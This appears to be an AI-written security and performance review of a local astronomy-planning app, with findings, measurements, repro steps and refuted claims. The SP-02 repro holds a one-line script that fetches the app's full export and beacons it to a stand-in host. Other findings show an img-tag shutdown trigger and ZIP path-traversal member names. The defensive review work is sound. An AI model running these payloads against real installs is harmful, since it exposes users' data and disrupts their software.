# Security & performance lane

Subject: `v0.6.32-3-g3277846` (HEAD `3277846`); tree clean apart from untracked
`REVIEW-PROMPT.md` + `reviews/0.6.32-full/`. Lane L8 (security/privacy) + L9
(performance). Probes are read-only and scratch-only (a scratch DB in `logs/`,
`create_app(db, prefetch=False)`, ephemeral ports only - nothing was left on 8407).
Evidence: `reviews/0.6.32-full/evidence/security/`.

## What I checked (and how)

- **Untrusted ZIP / restore** - `zip_hostile_probe.py`: 18 hostile `file` values,
  hostile member names, hostile panorama ids, case aliases, control characters, a
  10x4 MiB amplification bundle, `_read_member` peak RAM (`tracemalloc`), a forced
  payload-write failure, bundle `settings.image_dir`, malformed element types.
  **Symlink/junction escape** - `link_escape_probe.py` (a real NTFS junction inside
  `data/panos` pointing outside, made with `mklink /J`).
- **Local HTTP API** - `http_api_probe.py`: real uvicorn on an ephemeral port, raw
  `http.client`, browser-shaped headers (cross-site / forged same-origin / none /
  rebound `Host`), the deleted routes, error bodies, `/api/export` with no auth.
- **Default egress** - `server.py::start_image_prefetch` + `all_objects()`,
  `images.py`, `static/js/updater.js`, `weather.js`, `web/app.js::loadPopularity`;
  measured `data/imgcache`. **Secrets / ignore rules** - `git ls-files`,
  `git check-ignore` for `data/`, `logs/`, `app/_version_baked.py`,
  `web/version.json`, spool files, SQLite journals; a tree search for
  `*.env`/`*.pem`/`*.key`.
- **Performance (node 24 against the real baked core)** - `perf_web_catalog.mjs`,
  `perf_desktop_night.mjs`, `perf_sky_slider.mjs`, `cold_start_probe.py`; catalog
  gzip via `System.IO.Compression`.

## Security findings

### SP-01 medium CONFIRMED - a setup restore has no aggregate byte cap: ~1:1000 disk amplification from one crafted ZIP, up to ~2 GiB RAM per member
- `app/backup.py:50` (`MAX_MEMBER_BYTES = 1 << 30`), `:64-72`, `:195-222`;
  `app/server.py:48` (`_MAX_REQUEST_BYTES["/api/import"] = 2 GiB`).
- impact: a shared/hostile "setup backup" the user imports can fill the disk (the
  2 GiB cap counts *compressed* bytes; nothing caps total restored bytes) and spike
  RAM by ~2 GiB in one allocation per member.
- mechanism: `_read_member` caps ONE member at 1 GiB but accumulates a `bytearray`
  then copies it with `bytes(out)` (2x peak); no cap on the sum or the record count.
- evidence: 10 records x 4 MiB payload = 40 MiB written from a **42,096-byte** zip
  (ratio 996:1, 0.14 s); `_read_member` peak RAM for an 8 MiB member read with an
  8 MiB limit = **16.0 MB** (2x) => the default 1 GiB limit admits ~2 GiB.
- repro: `python reviews/0.6.32-full/evidence/security/zip_hostile_probe.py`
  -> keys `amplification`, `read_member_ram`.
- requiredFix: cap the SUM of restored bytes (fixed budget or upload x N) and stream
  each member with `shutil.copyfileobj` instead of materialising it.
- counterArgument: the user must choose to import the hostile ZIP (no
  fetch-a-backup flow) and 2 GiB on a 64-bit desktop usually swaps rather than dies
  - resource-exhaustion hardening, not a remote exploit. CONFIRMED from measured
  amplification + measured 2x peak, extrapolated to the shipped limit.

### SP-02 medium SUSPECTED - the desktop update check runs third-party JSONP inside the privileged localhost origin
- `static/js/updater.js:10,29-31,51`; `main.py:242` (API + UI share `127.0.0.1:8407`);
  no CSP and no `integrity` in `static/index.html`.
- impact: `ns-version.js` from `https://nightseam.de` executes as a script **in the
  app's own origin** 3 s after every launch (`main.js:168`). Whoever controls that
  response (compromised site, hijacked DNS/CA) gets a same-origin script that can
  read `/api/export` (whole setup + image library), `/api/state`, `/api/library`
  and call every state-changing route.
- evidence: `http_api_probe.py` - `plain_get_export` 200 (`GET /api/export`, no
  auth), `plain_get_state` 200 and leaks `image_dir:
  C:\Users\<user>\Documents\NightSeam Images` (also on `/api/library`); no response
  carries `access-control-allow-origin`, so only a script in that origin can read
  them.
- repro: in a browser running the packed app, stub the update URL with
  `fetch('/api/export').then(r=>r.blob()).then(b=>navigator.sendBeacon('https://x/',b))`
  and observe the request leave (or run that fetch from the app's own console).
- requiredFix: ship the update as JSON (`version.json` + a CORS header on that one
  static file) and `fetch()` it; JSONP is only needed because the site sends no CORS.
- counterArgument: it is the project's own site and every desktop updater shares this
  trust; it needs a third-party compromise. SUSPECTED because no browser was
  available here to observe the exfiltration - a real-browser run with a stubbed
  `ns-version.js` confirms it.

### SP-03 low CONFIRMED - `GET /api/shutdown` is a state-changing GET and the anti-cross-site guard fails open when the headers are absent
- `app/server.py:935-955`; guard `app/server.py:55-76` + `325-334`.
- impact: any client that omits `Sec-Fetch-Site`/`Origin` is treated as same-origin,
  so a browser that sends neither (pre-16.4 Safari, many embedded webviews, any local
  process) lets *any web page the user visits* kill the app with
  `<img src="http://127.0.0.1:8407/api/shutdown">`. Denial of service, not a leak
  (responses stay unreadable without CORS).
- evidence: `http_api_probe.py` - cross-site GET **403**, cross-site form POST **403**,
  cross-site multipart POST **403**, rebound `Host` **403**, forged same-origin 200,
  **no headers -> 200** (`_state["shutdown"]` set).
- repro: `python reviews/0.6.32-full/evidence/security/http_api_probe.py`.
- requiredFix: make shutdown `POST`-only (the UI already uses `api()`), or require a
  per-install token that `main.py` passes to the window it opens.
- counterArgument: every current browser sends `Sec-Fetch-Site`, so the vector is
  blocked there (verified above), the Host guard blocks rebinding, and the impact is
  one restart.

### SP-04 low CONFIRMED - `.gitignore` does not cover `data/`: an interrupted export leaves the user's whole setup untracked-but-committable
- `.gitignore:11-23` (patterns are `data/*.db`, `data/*.csv`, `data/panos/*`,
  `data/imgcache/`, `data/instance.json`, ... - never `data/`).
- impact: `app/server.py:679` spools the export to `data/.export-<hex>.zip`
  **inside `data/`**; if the download is aborted or the app is killed the file stays,
  is not ignored, and the setup ZIP (sites/rigs/panoramas + the whole image library)
  is one `git add -A` from being committed. `nightseam.db-journal` is the same story
  for raw DB pages.
- evidence: `git check-ignore` - `data/.export-deadbeef.zip` **not ignored**,
  `data/nightseam.db-journal` **not ignored**, `data/anything.json` **not ignored**;
  `data/nightseam.db.backup-auto.zip` ignored. `pragma journal_mode` = `delete` and a
  write transaction really creates `jm.db-journal` (measured). `git ls-files data` =
  only `data/panos/.gitkeep`.
- repro: `git check-ignore -v data/.export-deadbeef.zip data/nightseam.db-journal`.
- requiredFix: ignore `data/` and re-include `!data/panos/.gitkeep`, instead of
  enumerating artefacts.
- counterArgument: nothing is committed today, `AGENTS.md` forbids it, and the listed
  patterns cover the normal artefacts - but the documented rule ("never commit
  `data/`") is not what the file implements, and the two uncovered names hold user data.

### SP-05 low CONFIRMED - the import boundary stores records that can never resolve, and writes payloads for records it dropped
- `app/paths.py:39-53` (`_segment_ok`), `app/backup.py:195-206`,
  `app/database.py:951-958`, read path `app/server.py:578-595`.
- impact: a crafted bundle leaves a panorama row advertised by `/api/state` that
  404s forever, and/or drops junk into `data/panos`; a control character in `file`
  additionally aborts the restore with a 500 *after* the DB replace (that abort is
  the python lane's partial-restore item).
- mechanism: `safe_rel` rejects only NUL, `..`, absolutes, trailing-dot/space and
  device segments - `\x01`, `\n`, `\t`, `\x1b` pass - while Windows rejects them at
  `write_bytes`; and the payload loop iterates the RAW `panos` list, so a record whose
  id failed `safe_token` still gets its payload written.
- evidence (`zip_hostile_probe.py`): `file: "a\x01b.jpg"` -> row kept, then
  `OSError: [Errno 22] Invalid argument: ...\a\x01b.jpg`; id `..\evil` + file
  `planted.jpg` -> row dropped but `planted.jpg` **written** into `data/panos` and
  counted in `pano_images: 2`; `link_escape_probe.py` -> a junction under
  `data/panos` makes `safe_join` return `None`, yet the row is stored
  (`rows: ["escape/pwned.jpg"]`) with `pano_images: 0` - nothing escaped.
- requiredFix: reject control characters in `_segment_ok`, and drive the payload loop
  from the records `import_bundle` actually accepted (return them).
- counterArgument: nothing escapes `data/`, no NightSeam export produces these
  shapes, and the pre-import state stays recoverable from the auto-backup.

### SP-06 low SUSPECTED - the web planner feeds unvalidated third-party JSON into scoring, with no size or time limit
- `web/app.js:96-105`, `:106-120`, `:665`
  (`rows.sort((a, b) => (b.score - a.score) || (b.pop - a.pop))`).
- impact: if `popularity-source.invalid` returns a non-numeric value (`"n/a"`, `{...}`) every
  affected score is `NaN` and the ranking comparator returns `NaN` - an invalid
  ordering whose result is engine-defined; `true` silently becomes factor 0.3. No
  `AbortController`/timeout and no body-size limit, so a huge/endless response is
  buffered whole by `r.json()`.
- evidence: `popularity_malformed.mjs` against the real baked core -
  `non_numeric_string` -> `factor: "NaN"`, `nested_object` -> `"NaN"`,
  `boolean` -> `0.3`, `comparator_sample: "NaN"`, intended order not reproduced.
  The default `_popMap = {}` is also a prototype lookup: `_popMap["constructor"]`
  is a function -> `NaN`.
- repro: `node reviews/0.6.32-full/evidence/security/popularity_malformed.mjs`.
- requiredFix: `Number.isFinite(v) && v > 0` with an own-property check on a
  `Object.create(null)` map; add a timeout + size guard before parsing.
- counterArgument: numeric strings coerce fine, so only a real schema break or a
  hostile third party triggers it, and the baked catalog field covers offline. The
  end-to-end browser path was NOT run.

### SP-07 low SUSPECTED - the web panorama upload has no size cap: full-resolution decode plus a session-long base64 copy
- `web/horizon.js:564-571` (`readAsDataURL` of `files[0]`, no `f.size` check),
  `:540-550` (`p._img = imgDataUrl` kept for the session), `:86-98` (`compressImage`).
- impact: the picked file becomes a data URL (~1.37x its size) and is decoded at FULL
  resolution by `new Image()`; a 60 MB / 10000x5000 panorama holds ~80 MB of string
  plus a ~200 MB RGBA bitmap in the tab, and the 1400 px downscale happens afterwards
  - a tab crash on a phone. The desktop caps the same feature at 60 MB / 4096 px.
- evidence: read from the code path; `grep file.size` in `web/` = no match; data-URL
  inflation is exactly 4/3.
- repro: Chrome DevTools > Memory, web panorama editor, drop a 60 MB JPEG on a 4x CPU
  throttle; watch tab private bytes.
- requiredFix: branch on `f.size` (e.g. > 15 MB) and decode via
  `createImageBitmap(file, {resizeWidth: 1400})` instead of a data URL.
- counterArgument: the user chose the file, `p._img` is per-record and released with
  the view, and most amateur panoramas are a few MB - SUSPECTED (no browser here).

### Cross-referenced, NOT filed (python lane owns the correctness verdict)
A forced payload-write failure leaves the DB **committed** (sites/panoramas replaced)
while the payload is missing - reproduced: `sites_after: ["Imported"]`,
`panorama_rows_after: ["fail.jpg"]`, `OSError: forced payload write failure`.
Security verdict: **not exploitable** (no boundary crossed, nothing escapes `data/`)
and **recoverable** - I verified `<db>.backup-auto.zip` exists (393 bytes) and still
contains the pre-import site `"Keep me"`. The data-loss/correctness finding (payload
writes happen after `import_bundle` commits) belongs to the python lane.

## Performance findings

### SP-10 low SUSPECTED - the image cache grows forever and has no cleanup path
- `app/images.py:26,295-324` (`CACHE_DIR = data_dir()/"imgcache"`),
  `app/server.py:248-299`.
- impact: every distinct object whose detail view is opened (plus the ~200 standard
  objects the boot prefetch warms) leaves a `<slug>.bin` + `<slug>.json` pair that is
  never evicted, and neither shell offers a "clear image cache" control. Measured:
  **440 files / 24.8 MB / 220 objects ~= 113 KB each**; the advanced catalog has
  12,176 objects, so a user who browses it reaches ~1.3 GB with no way back.
- evidence: `Get-ChildItem data\imgcache` (440 files, 26,021,093 bytes, 0 negative
  markers); no prune/clear of `CACHE_DIR` outside tests. (Logs are fine:
  `main.py:27` rotates at 1 MB x2; baked core trees are pruned to N-1 by
  `scripts/build_core.py`.)
- repro: count `data/imgcache` after opening ~50 advanced-object detail views.
- requiredFix: an LRU byte cap enforced in `fetch_image`, plus a "clear cached
  images" action in Setup.
- counterArgument: 25 MB is harmless today and a re-fetch is cheap - but it is the one
  cache with no owner or limit.

## Refuted (claims I checked that are NOT bugs, with why)

- **Path traversal through a bundle** - 17 of 18 hostile values DROPPED; only the
  literal name `..%2f..%2fevil.jpg` is kept (percent signs are decoded nowhere, so it
  is just an odd filename inside `data/panos`). `zip_hostile_probe.py` -> `traversal`.
- **ZIP-slip via member names** - no `extractall`; only constructed
  `getinfo("panos/"+rel)` lookups. Members `../../evil1.jpg`, `/evil2.jpg`,
  `C:/evil3.jpg`, `panos/../../evil4.jpg`, `\evil5.jpg` wrote **nothing**
  (`escaped: []`).
- **Symlink/junction escape** - a real NTFS junction inside `data/panos` pointing
  outside is resolved by `safe_join` -> `None`, nothing written.
- **`settings.image_dir` redirect from a bundle** - ignored and re-injected
  (`app/backup.py:180-186`): measured `db_image_dir = <scratch>/archive` while the
  bundle asked for `<scratch>/OUTSIDE/redirect`, and `OUTSIDE` stayed empty.
- **A malicious web page reaching the local API** - cross-site simple GET, simple form
  POST, multipart POST and a rebound `Host` all **403**; no response carries
  `access-control-allow-origin`, so nothing is readable cross-origin either.
  **Deleted planning routes** - `/api/night` and `/api/object/{oid}` return **404**.
- **`POST /api/library/open_folder` as an arbitrary-path launch** - `rel` is
  normalised, `..` refused, the target must be inside the archive dir and `is_dir()`
  (`app/server.py:818-826`), so `os.startfile` can only open the user's own folder.
- **URL injection via an imported custom-target name** - `images.py:231`
  `quote(title.replace(" ","_"))`, `:208`/`:254` `urlencode`, and the resolver is
  wrapped in `except Exception -> None`: a name with CR/LF, `?` or `#` cannot become a
  header or a different endpoint (the host is fixed). **Secrets in the repo** - no
  `*.env`/`*.pem`/`*.key`/`ftp.env` in the tree; `ftps_deploy.py:26-41` reads
  `FTP_HOST/USER/PASS` from an external `--env` file and `.gitignore:6` covers `*.env`.
- **A per-object-per-sample O(n^2) blow-up in advanced mode** - measured, absent: the
  full 12,176-object x 241-sample night build costs **514 ms** (2,886,216 samples,
  5.6 M samples/s, +83 MB heap) vs 13 ms for 200 objects.
- **Slow cold start** - fresh DB create + 12,176-row seed **0.485 s**, later open
  0.176 s, `create_app` 0.061 s, `all_objects()` 2 ms.
- **Slow catalog parse / first paint** - `web/catalog.json` = 3,834,258 bytes;
  `JSON.parse` **13.1 ms**, gzip **659,561 bytes** (fastest 1,021,145) - transfer
  dominates, not parsing. A 60-row page builds in 0.15 ms; the `%`-sort of all 12,176
  rows 18 ms; `assignPopularityTiers` 2.7 ms. **Redundant per-row recomputation in
  `renderCatalog`** - real but too cheap to file: `cachedPctText` (`web/app.js:241`)
  calls `obsNightGrid()` -> `nightInfo()` once per row = **60 redundant 30-h twilight
  scans per page = 22 ms** (0.367 ms each); worth a memo next time someone is in the
  file.
- **Unnecessary re-renders on a slider drag** - the Min-visibility slider renders only
  on `change` (`web/app.js:1459-1464`); one Sky-View magnitude input event costs
  0.44-**5.1 ms** for `computeCandidates()` (worst case, mag 20) - inside the frame
  budget before the canvas redraw.
- **Egress by default** - weather is opt-in (`weather_auto` False, `server.py:410`);
  the desktop prefetch warms only `all_objects()` = 200 standard + custom targets
  (not 12,176); logs rotate. The only always-on egress is the update check (SP-02)
  and the web boot fetch (SP-06).

## Not checked (honest coverage gaps)

- **No browser in this session** (the sandbox cannot start Chromium - named-pipe mojo
  IPC; escalation is disabled for this subagent). So rendered costs are unmeasured:
  chart redraw on scrub/resize, the Sky-View hatch stroke count (`web/app.js:994`
  loops `2*diag/9` strokes per sector per draw), the panorama editor with a real large
  photo (SP-07 is SUSPECTED for this reason), memory over a long session, and the
  packed `dist\NightSeam.exe` / installer / other OS entirely.
- **The live site**: per lane rules I did not touch `nightseam.de`, so I cannot
  confirm whether `/astro/catalog.json` is served compressed (3.83 MB is the worst
  case; `web/` has no `.htaccess`) and did not inspect the currently served
  `ns-version.js` for SP-02.
- **End-to-end restore of a real multi-GB library**, and whether the auto-backup
  alone rebuilds every missing payload after a mid-restore abort (I only proved the
  pre-import rows/settings are in it).
- **Reparse points on the archive side** - I tested a junction under `data/panos`, not
  one in the user's configured image archive directory.
